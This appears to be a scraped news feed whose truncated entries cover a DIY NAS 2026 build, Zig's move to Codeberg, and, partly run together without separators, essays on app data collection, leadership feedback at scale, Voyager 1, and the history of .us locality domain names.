run Spearfoot’s Disk Burn-in and Testing script on all of my new drives. However, executing this script against all of the drives can take quite a long time, even if you use something like   to run the tests in parallel.There’s always a little bit of setup that I do for a new TrueNAS machine. This isn’t intended to be an all-inclusive step-by-step guide for all the things you should do with your DIY NAS. Instead, it’s more of a list of things I kept track of while I made sure that the  was functional enough for me to finish writing this blog. That being said, I do think your NAS would be rather functional if you decided to do the same configuration.Updated the hostname to Note:  This is only to avoid issues with another NAS on my network.Enabled the following services and set them to start automatically.
    Enabled password login for the  user.
    Note: If I were planning to use this DIY NAS long-term, I wouldn’t have done this. Using SSH keys for authentication is a better idea.Edited the TrueNAS Dashboard widgets to reflect the 10Gb interface ().Created a pool named  which consisted of a single RAID-Z2 vdev using eight hard drives that I had sitting on my shelf after they were decommissioned.Configured the Apps to use the  pool for the apps’ dataset.Made sure that the System Dataset Pool was set to .Confirmed that there were Scrub Tasks set up for the  and  pools.Created a dataset on each pool for testing:   and .Installed the Scrutiny app found in the App Catalog.If I were planning to keep this NAS and use it for my own purposes, I would also:Just about every year, I benchmark each DIY NAS build and almost always come to the same conclusion: The NAS will outperform your network at home. Your first bottleneck is almost always going to be the network, and the overwhelming majority of us have gigabit networks at home–but that’s slowly changing since 2.5Gbps and 10Gbps network hardware has started to get reasonably affordable lately.Even though I always come to the same conclusion, I still like to do the benchmarks for two reasons:It helps me build confidence that the  works well.People tend to enjoy consuming benchmarks,  it’s fun for me to see the DIY NAS’ network card get saturated during the testing.I like to do three categories of tests to measure the throughput of the NAS:Use iperf3 to benchmark throughput between my NAS and another machine on my network.Benchmark the throughput of the pool(s) locally on the NAS using .Set up SMB shares on each of the pools and then benchmark the throughput when using those shares.What do I think these benchmarks and my use of the  tell me?  In the grand scheme of things, not a whole lot.However, these benchmarks do back up what I expected: The  is quite capable and more than ready to meet my storage needs. I especially like that the CrystalDiskMark benchmarks of the SMB shares were both faster than a SATA SSD, and the throughput to the share on the  pool practically saturated the NAS’ 10GbE network connection.Every time I benchmark a NAS, I seem to either be refining what I tried in prior years or completely reinventing the wheel. As a result, I wouldn’t recommend comparing these results with results that I shared in prior years’ DIY NAS build blogs. I haven’t really put a ton of effort into developing a standard suite of benchmarks. Things in my homelab change enough between DIY NAS blogs that trying to create and maintain an environment for a standard suite of benchmarks is beyond what my budget, spare time, and attention span will allow.I’m going to paste these  commands here in the blog for my own use in future DIY NAS build blogs. If you wind up building something similar, these  be helpful to measure your new NAS’ filesystem’s performance and compare it to mine!## Random Write IOPS

One not-so-obvious cost of running a DIY NAS is how much power it consumes. While I specifically tried to pick items that were efficient in terms of power consumption, it’s also important to realize that all the other bells and whistles on the awesome Topton N22 NAS motherboard consume power, too, and that the biggest consumer of power in a NAS is almost always the hard disk drives.Thanks to my tinkering with home automation, I have a plethora of smart outlets which are capable of power monitoring. I used those smart outlets for most of my power monitoring. But I also have a Kill a Watt P400 that I also use for some of the shorter tests:Power consumed during a handful of specific tasks:
    Idle while running TrueNASRAM Burn-in (~14 passes of Memtest86+)An 8-hour throughput benchmark copying randomly sized files to the NAS using SMB.Total consumed during the build, burn-in, and use of the .Shortly before prices skyrocketed, I decided I wasn’t very interested in doing separate EconoNAS builds any longer. Several months ago, I realized that there were several off-the-shelf NAS machines that were more than capable of running TrueNAS, and they were selling at economical prices that couldn’t be topped by a DIY approach. I will dive deeper into this in a future blog, eventually … ?All that being said, it’d be incredibly easy to make some compromises which result in the  becoming quite a bit more economical. Here’s a list of changes that I would consider to achieve a more budget-friendly build:Altogether, these savings could add up to more than $400, which is pretty considerable!  If you made all of these changes, you’d have something that’s going to be nearly equivalent to the  but at a fraction of the price.What am I going to do with the DIY NAS: 2026 Edition?!My DIY NAS is aging quite gracefully, but I’ve recently been wondering about replacing it. Shortly before ordering all the parts for the , I briefly considered using this year’s DIY NAS build to replace my personal NAS. However, I decided not to do that. Then prices skyrocketed and I shelved the idea of building a replacement for my own NAS and I nearly shelved the idea of a DIY NAS in 2026!So that begs the question, “What is Brian going to do with the ?”I’m going to auction it off on the briancmosesdotcom store on eBay! Shortly after publishing this blog, I’ll list it on eBay. In response to skyrocketing prices for PC components, I’m going to do a no-reserve auction. At the end of the auction, the highest bidder wins, and hopefully they’ll get a pretty good deal!Overall, I’m pleased with the . The Topton N22 motherboard is a significant improvement over last year’s Topton N18 motherboard, primarily due to its extra two SATA ports. This provides 33.3% more gross storage capacity.While testing, I found the Intel Core 3 N355 CPU somewhat excessive for basic NAS functions. However, the substantial untapped CPU horsepower offers luxurious performance potential. This makes the build compelling for anyone planning extensive self-hosting projects.I have mixed feelings about the JONSBO N4 case. The four right-side drive bays lack SATA backplane connectivity. Without creative cabling solutions, individual drive replacement becomes challenging. However, the case’s ~$125 price point compensates for this inconvenience. I anticipate that those the cost savings will justify the compromise for most builders. If I were to build the  all over again, I’d be tempted to use the JONSBO N3 case or even the JONSBO N6 which isn’t quite obtainable, yet.The DIY NAS: 2026 Edition delivers excellent performance and superior specifications. In my opinion, it represents better value than off-the-shelf alternatives:Building your own NAS provides significant advantages. Years later, you can upgrade RAM, motherboard, case, or add PCI-e (x1) expansion cards. These off-the-shelf alternatives offer severely limited upgrade paths.]]></content:encoded></item><item><title>Green card interviews end in handcuffs for spouses of U.S. citizens</title><link>https://www.nytimes.com/2025/11/26/us/trump-green-card-interview-arrests.html</link><author>nxobject</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 02:51:31 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Penpot: The Open-Source Figma</title><link>https://github.com/penpot/penpot</link><author>selvan</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 02:14:36 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Migrating the main Zig repository from GitHub to Codeberg</title><link>https://ziglang.org/news/migrating-from-github-to-codeberg/</link><author>todsacerdoti</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 01:49:00 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[

      Putting aside GitHub’s relationship with ICE, it’s abundantly clear that the engineering excellence that created GitHub’s success is no longer driving it. Priorities and the engineering culture have rotted, leaving users inflicted with some kind of bloated, buggy JavaScript framework in the name of progress. Stuff that used to be snappy is now sluggish and often entirely broken.Most importantly, Actions has inexcusable bugs while being completely neglected. After the CEO of GitHub said to “embrace AI or get out”, it seems the lackeys at Microsoft took the hint, because GitHub Actions started “vibe-scheduling”; choosing jobs to run seemingly at random. Combined with other bugs and inability to manually intervene, this causes our CI system to get so backed up that not even master branch commits get checked.Rather than wasting donation money on more CI hardware to work around this crumbling infrastructure, we’ve opted to switch Git hosting providers instead.As a bonus, we look forward to fewer violations (exhibit A, B, C) of our strict no LLM / no AI policy, which I believe are at least in part due to GitHub aggressively pushing the “file an issue with Copilot” feature in everyone’s face.The only concern we have in leaving GitHub behind has to do with GitHub Sponsors. This product was key to Zig’s early fundraising success, and it remains a large portion of our revenue today. I can’t thank Devon Zuegel enough. She appeared like an angel from heaven and single-handedly made GitHub into a viable source of income for thousands of developers. Under her leadership, the future of GitHub Sponsors looked bright, but sadly for us, she, too, moved on to bigger and better things. Since she left, that product as well has been neglected and is already starting to decline.Although GitHub Sponsors is a large fraction of Zig Software Foundation’s donation income, we consider it a liability. We humbly ask if you, reader, are currently donating through GitHub Sponsors, that you consider moving your recurring donation to Every.org, which is itself a non-profit organization.As part of this, we are sunsetting the GitHub Sponsors perks. These perks are things like getting your name onto the home page, and getting your name into the release notes, based on how much you donate monthly. We are working with the folks at Every.org so that we can offer the equivalent perks through that platform.Effective immediately, I have made ziglang/zig on GitHub read-only, and the canonical origin/master branch of the main Zig project repository is https://codeberg.org/ziglang/zig.git.Thank you to the Forgejo contributors who helped us with our issues switching to the platform, as well as the Codeberg folks who worked with us on the migration - in particular Earl Warren, Otto, Gusted, and Mathieu Fenniak.In the end, we opted for a simple strategy, sidestepping GitHub’s aggressive vendor lock-in: leave the existing issues open and unmigrated, but start counting issues at 30000 on Codeberg so that all issue numbers remain unambiguous. Let us please consider the GitHub issues that remain open as metaphorically “copy-on-write”. Please leave all your existing GitHub issues and pull requests alone. No need to move your stuff over to Codeberg unless you need to make edits, additional comments, or rebase. We’re still going to look at the already open pull requests and issues; don’t worry.In this modern era of acquisitions, weak antitrust regulations, and platform capitalism leading to extreme concentrations of wealth, non-profits remain a bastion defending what remains of the commons.]]></content:encoded></item><item><title>Common Desktop Environment &quot;CDE&quot; 2.5.3 Released After Two Years</title><link>https://www.phoronix.com/news/CDE-2.5.3-Desktop</link><author>Michael Larabel</author><category>tech</category><pubDate>Thu, 27 Nov 2025 01:43:20 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Two years and one week since the prior point release, Common Desktop Environment 2.5.3 is now available as the latest iteration of this Unix desktop environment built around the Motif toolkit.

Archaeologists have been excavating in Jamestown, Virginia for more than 20 years. In April 2012, a team of Historic Jamestowne archeologists discovered something surprising. In the trash layer of a cellar, among the butchered animal bones and household trash discarded by the Jamestown colonists, they found the mutilated skull and severed leg of a 14-year-old English girl dating back to 1609.

Jamestown, Virginia is the site of the first permanent English colony the Americas settled in 1607 and the home of the archaeological site “Historic Jamestowne” today. It has long been speculated that the harsh conditions faced by the colonists during the winter of 1609, often referred to as the “starving time,” might have made them desperate enough to participate in the unthinkable.

I’m done arriving at hotels and discovering that they have removed the bathroom door. Something that should be as standard as having a bed, has been sacrificed in the name of “aesthetic”.I get it, you can save on material costs and make the room feel bigger, but what about my dignity??? I can’t save that when you don’t include a bathroom door.It’s why I’ve built this website, where I compiled hotels that are guaranteed to have bathroom doors, and hotels that need to work on privacy. I’ve emailed hundreds of hotels and I asked them two things: do your doors close all the way, and are they made of glass? Everyone that says yes to their doors closing, and no to being made of glass has been sorted by price range and city for you to easily find places to stay that are  to have a bathroom door.Quickly check to see if the hotel you’re thinking of booking has been reported as lacking in doors by a previous guest.Finally, this passion project could not exist without people submitting hotels without bathroom doors for public shaming. If you’ve stayed at a doorless hotel send me an email with the hotel name to bringbackdoors@gmail.com, or send me a DM on Instagram with the hotel name and a photo of the doorless setup to be publicly posted.Let’s name and shame these hotels to protect the dignity of future travelers.]]></content:encoded></item><item><title>Operation Gunnerside: The Allied Mission To Sabotage The Nazi Nuclear Program</title><link>https://www.youtube.com/watch?v=2jPYoqlbLpc</link><author>Timeline - World History Documentaries</author><category>yt</category><enclosure url="https://www.youtube.com/v/2jPYoqlbLpc?version=3" length="" type=""/><pubDate>Wed, 26 Nov 2025 22:00:03 +0000</pubDate><source url="https://www.youtube.com/channel/UC88lvyJe7aHZmcvzvubDFRg">Timeline - World History Documentaries</source><content:encoded><![CDATA[Uncover the thrilling true story of "The Heavy Water War" during WW2, a desperate Allied effort to prevent Nazi Germany from developing an atomic bomb.

Here in Taiwan it’s particularly bad: I’ve
had shop staff tell me about some discount if you download their app, and when I
decline, say something like “It’s really easy! Here, just give me your phone and
I’ll do it for you.” Once when I was setting up my phone plan, the staff wanted
my phone to, idk, note my IMEI or something, and then when I wasn’t paying
attention, installed a local e-commerce app, using my new phone number and name
as login details, then proudly told me, “Now you get 300NTD off your first phone
bill!” Thanks, for 10$ I can get weekly text and email spam from Shopee, great.So first tip, in Taiwan, never hand your phone over the counter.Second tip, never download the app. Corps have all sorts of ways to try to
convince you: Use the app to order in-store rather than the kiosk, get free
chicken nuggets. Download our app at checkout, get a discount. Whatever the
reason, don’t do it, you’re giving more than you’re getting.First, we’ve entered an era defined by
surveillance capitalism.
Companies try to get as much data on you as possible, and then treat you
differently based on the data they have on file for you. We all know this as
seeing poorly-tuned ads (you just bought a refrigerator? You must love
refrigerators! Here’s 100 refrigerator ads), but the new trend is
surveillance pricing.
A company will know that you just got paid and so charge you just a bit more for
your chicken nuggets than they do when you haven’t been paid in two weeks.
Annoying, don’t download them app, don’t give them more data than they already
have.The other scary thing though is that that gives the power of currency valuation
to companies. Without surveillance pricing, everyone pays the same for a
cheeseburger. Rich people can buy more cheeseburgers, sure, but at least the
price of cheeseburgers is pegged against a dollar, so if someone starts charging
too much for cheeseburgers, you can take your dollars to a competitor. Once
companies can start charging individual prices, the global economy doesn’t
determine how many cheeseburgers your dollars can buy, McDonald’s does. Way too
much power to give to these companies that already have too much power.Second reason, binding arbitration. Binding arbitration is when you sign an
agreement with someone that has a clause that says, “if there’s a dispute, we
don’t sue eachother, instead we go through a private process outside the court
system and let a mediator decide the outcome.” Bonus, unlike judges, whose
salaries are paid for by the taxpayers and therefore you don’t pay a “judge fee”
when you go to court (mostly), a mediator needs to be hired. Guess who hires
them? Not you!Walking into a restaurant to buy a cheeseburger, there’s no way a company can
force you to enter a contractual agreement that includes binding arbitration.
Downloading an app, however, requires agreeing to a “Terms of Service,” and
those can  include a binding arbitration clause, and that clause can
be applied even to cases outside the app. This happened to Jeffrey Piccolo when
his wife died of food poisoning in a Disney World. Disney made a motion to
dismiss because a couple years back, Jeffrey had signed up for a free trial of
Disney+, which included a binding arbitration clause, which meant that if
Jeffrey wanted to complain about how Disney murdered his wife, they’d have to
settle it out of court with a mediator that Disney hired. No jury, no judge, no
oversight. In the end the only reason Disney dropped this motion is because the
news picked it up. That won’t always happen.At least in the USA, binding arbitration is totally cool according to the
Supreme Court, so don’t count on the government to save you. You need to take
personal steps to make sure you aren’t signing your rights away. So, don’t
download apps.Predictions: Sometime in the next 5 years, someone will be forced into
arbitration with Uber after being hit by one of their self driving cars, because
they use Uber Eats. Sometime in the next 5 years, someone’s house will burn down
from their Tesla exploding, and they’ll be forced into arbitration because they
had a Twitter account, and Twitter is now a subsidiary of TeXla. Sometime in the
next 5 years, an Amazon employee who lost a finger on the job will be forced
into arbitration because they have a WaPo subscription.If you want to learn more,

This Supercut dives into the enigma of Betelgeuse, our red giant neighbour star on the brink of supernova. But will this spectacular death happen in our lifetime? And should we be worried here on Earth? Beyond the impending explosion, we uncover the exciting new discovery of Betelgeuse’s companion, affectionately dubbed "Betelbuddy." See how this partner star could be the key to understanding Betelgeuse’s strange, erratic activity.

To those returning and new to the channel: This video is a supercut of our previous videos about Betelgeuse, along with new and updated science content. We’ve edited this into a new seamless video, remastered in 4K resolution, and re-recorded the older voiceover to match the quality of the recent episodes.

In a society that's predominantly focused on outward appearance, hair wields huge social capital. It can either elicit admiration — or turn into a problem.

A full, glossy head of hair is synonymous with beauty, youth and vitality. But what happens when that hair loses its shine? As we age, our hair gets thinner, alters its structure or falls out. Can anything be done to address these changes? How do we learn to be content with the hair we have — or with no hair whatsoever? Are hair transplants worth the bother?

This documentary observes people for whom hair is of particular importance: an actor who is happy to be bald, a man who decides to have a hair transplant and a hair artist whose hair can do incredible things, such as supporting her entire body weight. This is due to the structure of hair: each individual strand consists of numerous protein spirals linked together by chemical bonds. That makes it incredibly elastic and highly stable: a single hair can hold up to 100 grams without breaking.

Christology is the theology of Jesus—the person, life, nature, essence and meaning of the Godhead Being who was incarnated in the human person Jesus. Some Christian theologians claim that aspects of Christology can articulate with fundamental understandings of science. Most scientists would be baffled by the claim.

It's not even really "feedback”: you’re just . You may have hired everyone yourself. You might sit near them (or at least sit near them virtually). Maybe you have lunch with them regularly. You know their kids' names, their coffee preferences, and what they're reading. So when someone has a concern about the direction you're taking things, they just... tell you.You trust them. They trust you. It's just friends talking. You know where they're coming from.At twenty people, things begin to shift a little. You’re probably starting to build up a second layer of leadership and there are multiple teams under you, but you're still fairly close to everyone. The relationships are there, they just may be a bit weaker than before. When someone has a pointed question about your strategy, you probably  know their story, their perspective, and what motivates them. The context is fuzzy, but it’s still there.Somewhere around 100 people, the ground shifts underneath you, as you realize you don’t know everyone anymore. You just can't. There aren't enough hours in the day, and honestly, there aren't enough slots in your brain.Suddenly you have people whose names you don’t recognize offering very sharp commentary about your “leadership.” They’re talking about you but they don’t  you. There’s no shared history, no accumulated trust, no sense of “we’ve been in the trenches together.” Your brain has no context for processing all these voices.Who are these people? Why are they yelling at me? Are they generally reasonable, or do they complain about everything? Do they understand the constraints we're under? Do they have the full picture?Without an existing relationship, it feels like an attack, and your natural human response is to dismiss or deflect the attack. Or worse, to get defensive. Attacks trigger our most primal instincts: fight or flight.This is the point where a lot of leaders start to struggle. They still want to be open to feedback—they really do—but they're also drowning. They start trusting their intuition about what they should pay attention to and what they should ignore. Sometimes that intuition is right. Sometimes it's just... self-selected, stripped of context, pattern matching against existing biases and relationships.On top of that, each extra layer of management, each extra level to the top has separated you, and now you’re just not like them anymore. Their struggles are not your struggles anymore.By the time you reach 200 people or more, feedback isn't an actionable signal anymore. At that size, feedback stops being signal being noise. A big, echoing amphitheater of opinions, each louder than the last, each written in the tone of someone who is absolutely  they understand the whole system (they don’t), the whole context (they don’t), and your motives (they definitely don’t).And all those kudos you used to hear? Those dry up. When you had a close relationship with everyone, kudos came naturally. You were just talking. But now folks just expect you to lead, and if they’re happy with your leadership they’re probably mostly quiet about it. They're doing their jobs, trusting you, assuming things are generally fine.The people who are unhappy? They're loud. And there are a lot of them.From where you sit, it feels like everybody's mad about everything all the time. And maybe they are! Or maybe it's just selection bias combined with the natural amplification that happens when people with similar grievances find each other.  You don't know if this is a real crisis or just three loud people who found each other in a Slack channel. You just can’t tell anymore.Because feedback doesn’t scale. Humans scale poorly. Your nervous system definitely doesn’t scale.Feedback doesn't scale because relationships don’t scale. With five people, you have some personal interaction with everyone on the team. At twenty, you interact with some, but not all. At 100 you still have personal relationships with 10 or 15 people, so there are a lot of gaps. At 200, your personal relationships are a tiny slice of the overall pie.Making matters worse, as the din gets louder and louder, channels for processing all that feedback get smaller and smaller. Where you once had an open-door policy, now you have “office hours.” Sometimes. When we’re not too busy.Where once All-Hands meetings had open questions, now you’re forced to take the questions ahead of time. Or not at all.Even your Slack usage dwindles, because half the time you say anything, someone’s upset with it.We tell ourselves we're "staying close to the ground" and "maintaining our culture,” But we're not. We can't. Because the fundamental math doesn't work. The sheer volume of feedback we’re getting absolutely overwhelms our ability to process it.So what do you do about it?#First, you have to admit the problem exists. Stop pretending you can maintain personal relationships with 200 people. You can't. Nobody can. Once you accept this, you can start building systems and processes that work with this reality instead of bumping against it. You have to filter, sort, and collate the feedback coming in, and you need to do it at a scale larger than your own capacity.When you can’t rely on “just talk to people,” you need systems that distinguish between:and “this person is projecting a whole other problem onto leadership”That means: structured listening, actual intake processes, and ways to synthesize themes instead of reacting to every single spike.Build proxy relationships. You can't know 200 people, but you can know 10 people who each know 10 people. You should already have strong, trusting relationships with your leadership team, and then set the expectation that they have strong relationships with their own teams, and explicitly ask what’s on people’s minds. When feedback comes up through this chain, it comes with context. Pay attention.At small scale, trust is direct:  At larger scale, trust must be delegated: I trust the leaders who are closer to the work than I am. If you don’t intentionally empower those leaders to absorb and contextualize feedback, you’ll drown. They’re the ones who can say: "I know who said that, why they said it, and here’s what’s actually going on."Build structured channels for feedback. For example, you can set up working groups to dive into thorny problems. The people closest to the problem understand it better than you do, and they can turn a flood of complaints into something you can actually act on. Or consider starting an "employee steering committee" for the sole purpose of collecting feedback and turning it into proposals. You’re essentially deputizing people who care deeply to listen for you, and then manage the feedback din.Remember that every angry message is still a person. When someone you know well gives you feedback, you might not like it, but you’re likely to say "Oof. Okay. Let’s talk." At scale, you need to find ways to respond with humanity — even when the feedback you received lacks it. Let people know when you’re acting on their feedback, and if you’re not going to act on it, let them know that you at least heard it. Nobody wants to feel unheard.In fact, you'll probably think — if you haven't done it already — that you should have an anonymous comment system to capture feedback. Don't. It's a trap. Anonymous feedback is the most contextless feedback you'll get, which makes it the least actionable. And it inevitably turns out to be contradictory or lacking key information, all those folks feel even more unheard and unhappy than before.Finally, accept that you're going to get it wrong sometimes, and own that. You're going to ignore feedback that turns out to be important. You're going to overreact to feedback that turns out to be noise. When you make a misstep, be transparent about how you're correcting it.Past a certain size, you have to make peace with the fact that a lot of people in your org are going to be frustrated with you, and you're going to have no idea why, and you may not going to be able to fix it.Not because you're a bad leader. Not because you don't care. But because feedback doesn't scale, relationships don't scale, and the alternative—trying to maintain authentic personal connections with hundreds of people—is a recipe for burnout and failure.This is genuinely hard to accept, especially if you came up through the early days when you did know everyone. That version of leadership was real, and it worked, and it probably felt really good. But it doesn't work anymore, and pretending it does just makes things worse.Note: The photo is of a large crowd gathering for a union meeting during the 1933 New York Dressmakers Strike. That's scaling feedback.

By November 15, 2026, it will be 16.1 billion miles (25.9 billion km) away, meaning a radio signal will take a full 24 hours—a full light-day—to reach it. For context, a light-year is the distance light travels in a year, about 5.88 trillion miles (9.46 trillion km), so one light-day is just a tiny fraction of that.Communicating with Voyager 1 is slow. Commands now take about a day to arrive, with another day for confirmation. Compare that to the Moon (1.3 seconds), Mars (up to 4 minutes), and Pluto (nearly 7 hours). The probe’s distance makes every instruction a patient exercise in deep-space operations. To reach our closest star, Proxima Centauri, even at light speed, would take over four years—showing just how tiny a light-day is in cosmic terms.Voyager 1’s journey is more than a record for distance.

I remember vinyl tile floors,
the playground, the teacher sentencing me to standing in the hallway. I had a
teacher who was a chess fanatic; he painted a huge chess board in the paved
schoolyard and got someone to fabricate big wooden chess pieces. It was enough
of an event to get us on the evening news. I remember Run for the Arts, where I
tried to talk people into donating money on the theory that I could run, which
I could not. I'm about six months into trying to change that and I'm good for a
mediocre 5k now, but I don't think that's going to shift the balance on K-12
art funding.I also remember a domain name: bridger.pps.k12.or.usI have quipped before that
computer science is a field mostly concerned with assigning numbers to things,
which is true, but it only takes us so far. Computer scientists also like to
organize those numbers into structures, and one of their favorites has always
been the tree. The development of wide-area computer networking surfaced a
whole set of problems around naming or addressing computer systems that belong
to organizations. A wide-area network consists of a set of institutions that
manage their own affairs. Each of those institutions may be made up of
departments that manage their own affairs. A tree seemed a natural fit. Even
the "low level" IP addresses, in the days of "classful" addressing, were
a straightforward hierarchy: each dot separated a different level of the tree,
a different step in an organizational hierarchy.The first large computer networks, including those that would
become the Internet, initially relied on manually building lists of machines by
name. By the time the Domain Name System was developed, this had already become
cumbersome. The rapid growth of the internet was hard to keep up with, and besides,
why did any one central entity---Jon Postel or whoever---even care about the
names of all of the computers at Georgia Tech? Like IP addressing, DNS was designed
as a hierarchy with delegated control. A registrant obtains a name in the hierarchy,
say gatech.edu, and everything "under" that name is within the control, and
responsibility, of the registrant. This arrangement is convenient for both the
DNS administrator, which was a single organization even after the days of Postel,
and for registrants.We still use the same approach today... mostly. The meanings of levels of the
hierarchy have ossified. Technically speaking, the top of the DNS tree, the DNS
root, is a null label referenced by a trailing dot. It's analogous to the '/'
at the beginning of POSIX file paths. "gatech.edu" really should be written as
"gatech.edu." to make it absolute rather than relative, but since resolution of
relative URLs almost always recurses to the top of the tree, the trailing dot
is "optional" enough that it is now almost always omitted. The analogy to POSIX
file paths raises an interesting point: domain names are backwards. The 'root'
is at the end, rather than at the beginning, or in other words, they run from
least significant to most significant, rather than most significant to least
significant. That's just... one of those things, you know? In the early days
one wasn't obviously better than the other, people wrote hierarchies out both
ways, and as the dust settled the left-to-right convention mostly prevailed
but right-to-left hung around in some protocols. If you've ever dealt with
endianness, this is just one of those things about computers that you have to
accept: we cannot agree on which way around to write things.Anyway, the analogy to file paths also illustrates the way that DNS has ossified.
The highest "real" or non-root component of a domain name is called the top-level
domain or TLD, while the component below it is called a second-level domain. In
the US, it was long the case that top-level domains were fixed while second-level
domains were available for registration. There have always been exceptions in
other countries and our modern proliferation of TLDs has changed this somewhat,
but it's still pretty much true. When you look at "gatech.edu" you know that
"edu" is just a fixed name in the hierarchy, used to organize domain names by
organization type, while "gatech" is a name that belongs to a registrant.Under the second-level name, things get a little vague. We are all familiar with
the third-level name "www," which emerged as a convention for web servers and
became a practical requirement. Web servers having the name "www" under an
organization's domain was such a norm for so many years that hosting a webpage
directly at a second-level name came to be called a "naked domain" and had some
caveats and complications.Other than www, though, there are few to no standards for the use of third-level
and below names. Larger organizations are more likely to use third-level names
for departments, infrastructure operators often have complex hierarchies of
names for their equipment, and enterprises the world 'round name their load-balanced
webservers "www2," "www3" and up. If you think about it, this situation seems like
kind of a failure of the original concept of DNS... we do use the hierarchy, but
for the most part it is not intended for human consumption. Users are only
expected to remember two names, one of which is a TLD that comes from a relatively
constrained set.The issue is more interesting when we consider geography. For a very long time, TLDs
have been split into two categories: global TLDs, or gTLDs, and country-code TLDs,
or ccTLDs. ccTLDs reflect the ISO country codes of each country, and are intended for
use by those countries, while gTLDs are arbitrary and reflect the fact that DNS was
designed in the US. The ".gov" gTLD, for example, is for use by the US government,
while the UK is stuck with ".gov.uk". This does seem unfair but it's now very much
cemented into the system: for the large part, US entities use gTLDs, while entities
in other countries use names under their respective ccTLDs. The ".us" ccTLD exists
just as much as all the others, but is obscure enough that my choice to put my
personal website under .us (not an ideological decision but simply a result of where
a nice form of my name was available) sometimes gets my email address rejected.Also, a common typo for ".us" is ".su" and that's geopolitically amusing. .su is of
course the ccTLD for the Soviet Union, which no longer exists, but the ccTLD lives
on in a limited way because it became Structurally Important and difficult to remove, as names and addresses
tend to do.We can easily imagine a world where this historical injustice had been fixed: as
the internet became more global, all of our US institutions could have moved under
the .us ccTLD. In fact, why not go further? Geographers have long organized political
boundaries into a hierarchy. The US is made up of states, each of which has been
assigned a two-letter code by the federal government. We have ".us", why not "nm.us"?The answer, of course, is that we do.In the modern DNS, all TLDs have been delegated to an organization who administers
them. The .us TLD is rightfully administered by the National Telecommunications and
Information Administration, on the same basis by which all ccTLDs are delegated to
their respective national governments. Being the US government, NTIA has naturally
privatized the function through a contract to telecom-industrial-complex giant
Neustar. Being a US company, Neustar restructured and sold its DNS-related business
to GoDaddy. Being a US company, GoDaddy rose to prominence on the back of infamously
tasteless television commercials, and its subsidiary Registry Services LLC now
operates our nation's corner of the DNS.But that's the present---around here, we avoid discussing the present so as to hold
crushing depression at bay. Let's turn our minds to June 1993, and the publication of
RFC 1480 "The US Domain." To wit:Even though the original intention was that any educational
institution anywhere in the world could be registered under the EDU
domain, in practice, it has turned out with few exceptions, only
those in the United States have registered under EDU, similarly with
COM (for commercial). In other countries, everything is registered
under the 2-letter country code, often with some subdivision.  For
example, in Korea (KR) the second level names are AC for academic
community, CO for commercial, GO for government, and RE for research.
However, each country may go its own way about organizing its domain,
and many have.Oh, so let's sort it out!There are no current plans of putting all of the organizational
domains EDU, GOV, COM, etc., under US.  These name tokens are not
used in the US Domain to avoid confusion.Currently, only four year colleges and universities are being
registered in the EDU domain.  All other schools are being registered
in the US Domain.RFC 1480 is a very interesting read. It makes passing references to so many
facets of DNS history that could easily be their own articles. It also
defines a strict, geography-based hierarchy for the .us domain that is a
completely different universe from the one in which we now live. For example,
we learned above that, in 1993, only four-year institutions were being
placed under .edu. What about the community colleges? Well, RFC 1480 has an
answer. Central New Mexico Community College would, of course, fall under
cnm.cc.nm.us. Well, actually, in 1993 it was called the Technical-Vocational
Institute, so it would have been tvi.tec.nm.us. That's right, the RFC
describes both "cc" for community colleges and "tec" for technical institutes.Even more surprising, it describes placing entities under a "locality" such as
a city. The examples of localities given are "berkeley.ca.us" and "portland.wa.us", the
latter of which betrays an ironic geographical confusion. It then specifies "ci"
for city and "co" for county, meaning that the city government of our notional
Portland, Washington would be ci.portland.wa.us. Agencies could go under the
city government component (the RFC gives the example "Fire-Dept.CI.Los-Angeles.CA.US")
while private businesses could be placed directly under the city (e.g. "IBM.Amonk.NY.US").
The examples here reinforce that the idea itself is different from how we use DNS
today: The DNS of RFC 1480 is far more hierarchical and far more focused on full
names, without abbreviations.Of course, the concept is not limited to local government. RFC 1480 describes
"fed.us" as a suffix for the federal government (the example "dod.fed.us" illustrates
that this has not at all happened), and even "General Independent Entities" and
"Distributed National Institutes" for those trickier cases.We can draw a few lessons from how this proposal compares to our modern day.
Back in the 1990s, .gov was limited to the federal government.
The thinking was that all government agencies would move into .us, where the
hierarchical structure made it easier to delegate management of state and
locality subtrees. What actually happened was the opposite: the .us thing
never really caught on, and a more straightforward and automated management
process made .gov available to state and local governments. The tree has
effectively been flattened.That's not to say that none of these hierarchical names saw use.
GoDaddy continues to maintain what they call the "usTLD Locality-Based
Structure". At the decision of the relevant level of the hierarchy (e.g.
a state), locality-based subdomains of .us can either be delegated to
the state or municipality to operate, or operated by GoDaddy itself as
the "Delegated Manager." The latter arrangement is far more common, and
it's going to stay that way: RFC 1480 names are not dead, but they are
on life support. GoDaddy's contract allows them to stop onboarding any
additional delegated managers, and they have.Few of these locality-based names found wide use, and there are even
fewer left today. Multnomah County Library once used "multnomah.lib.or.us,"
which I believe was actually the very first "library" domain name registered.
It now silently redirects to "multcolib.org", which
we could consider a graceful name only in that the spelling of
"Multnomah" is probably not intuitive to those not from the region. As
far as I can tell, the University of Oregon and OGI (part of OHSU)
were keeping very close tabs on the goings-on of academic DNS, as
Oregon entities are conspicuously over-represented in the very early
days of RFC 1480 names---behind only California, although Georgia
Tech and Trent Heim of former Colorado company XOR both registered enough names to give their
states a run for the money."co.bergen.nj.us" works, but just gets you a redirect notice page to
bergencountynj.gov. It's interesting that this name is actually longer
than the RFC 1480 name, but I think most people would agree that bergencountynj.gov
is easier to remember. Some of that just comes down to habit, we all know ".gov",
but some of it is more fundamental. I don't think that people often
understand the hierarchical structure of DNS, at least not intuitively, and
that makes "deeply hierarchical" (as GoDaddy calls them) names confusing.Certainly the RFC 1480 names for school districts produced complaints.
They were also by far the most widely adopted. You can pick and choose
examples of libraries (.lib.[state].us) and municipal governments that have
used RFC 1480 names, but school districts are another world: most school
districts that existed at the time have a legacy of using RFC 1480 naming.
As one of its many interesting asides, RFC 1480 explains why: the practice
of putting school districts under [district].k12.[state].us actually
predates RFC 1480. Indeed, the RFC seems to have been written in part to
